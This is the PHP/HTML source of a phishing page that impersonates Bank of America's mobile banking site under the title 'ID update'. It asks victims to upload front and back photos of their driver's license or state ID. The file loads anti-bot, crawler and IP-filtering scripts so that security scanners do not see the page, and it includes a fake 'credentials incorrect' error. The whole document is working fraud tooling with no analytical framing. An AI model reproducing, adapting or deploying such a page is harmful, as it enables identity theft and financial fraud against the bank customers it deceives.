<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<title>Bank of America | ID update</title>
    <link rel="shortcut icon" href="../bstyles/favicon.ico?ts=20151018" type="image/x-icon">
	<link rel="stylesheet" href="../bstyles/bactouch.css"><link rel="stylesheet" href="../bstyles/toolbar.css"><link rel="stylesheet" href="../bstyles/bact_listview.css"><link rel="stylesheet" href="../bstyles/footer.css"><link rel="stylesheet" href="../bstyles/slidemenu.css">
	<style>.signonVersionTwoHomePage{max-width:400px;margin:auto;}
	.fsd-secure-esp-skin {
    padding: 20px 0 20px 20px;
	;}
	.dsrt{width:50%}
	.srt{width:80%}
	.upper{text-transform:uppercase;}
label.inputContainer {
    display: block;
    min-height: 44px;
    line-height: 44px;
    margin: 9px 9px;
    padding-left: 10px;
    padding-right: 10px;
    font-size: 15px;
    background: rgba(255,255,255,1);
    color: rgba(51,46,37,1);
    border: 1px solid rgba(218,212,203,1);
    -moz-border-radius: 8px;
    -webkit-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
}
	</style>
	</head>

	<body>
	<div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
	<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="../bstyles/BofA_rgb.png">
      <div class="clearboth"></div>
   </div>
</div>
<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Upload ID Photos</div></h1><a id="rightButton" class="hidden"></a></div><div class="pageMinHeight">
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">

	<div id="accountLocked" class="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'hidden';}?>">
		<ul class="listView edge">
			<li role="button" class="noLink">
				<div class="imageWrap paddingHoriz20"><img src="../bstyles/ico_alert@2x.png" class=""></div>
				<p class="subVal padding10 fontRed" id="headError">Error</p>
				<p class="subVal padding10" id="bodyError">The Credentials you entered were incorrect. Please try again..</p>
			</li>
		</ul>
	</div>
	
	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="">
		<div class="toppad5">
			<fieldset>
				<div class="inputEntryContainer">
				<form id="frmCustomOnlineId" method="post" enctype="multipart/form-data" action="vn">

<div class="clear-both">			
 <div style="text-align: center;border-bottom:1px dashed;margin-bottom:20px;">
<img src="../bstyles/grin.svg" style="height: 130px;">

<p style="margin-top:20px;padding:0 10px;">1.Photo of your ID document (both sides for driver license or state ID) </p>
<p style="margin-bottom:20px;padding:0 10px;">2.The photos must be clear (PDF - JPG - PNG)</p>
</div>
<div>
<label class="inputContainer">
	<label for="i1">Front photo of ID</label><br>
    <input id="i1" type="file" name="my_filefront" accept="image/*" required=""><br>
					</label>
<label  class="inputContainer">
	<label for="i2">Back photo of ID</label><br>
    <input id="i2" type="file" name="my_fileback" accept="image/*" required=""><br>
					</label>
</div>
						<div class="clear-both"></div>
						</div>
				<input type="hidden" name="upppp" value="<?php echo uniqid();?>">
				</form></div>
				
			</fieldset>
		</div>
	</div>
	
	</div>
	<div>	
		<a id="btSignonContinue" href="javascript:void(0);" onclick="frmCustomOnlineId.submit();" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="../bstyles/secure_lock.png">
			<span id="signonLabel">Continue</span>
		</a>
	</div>
	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center"></div>
		<div class="padding10"></div>
	</div>
	
	<div id="btnPin" style="position: fixed; bottom: 0px; display: none; height: auto;">
		<ul class="btnGroupPin">
			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
		</ul>
	</div>
</div>
</div></div>
		
	
</body></html>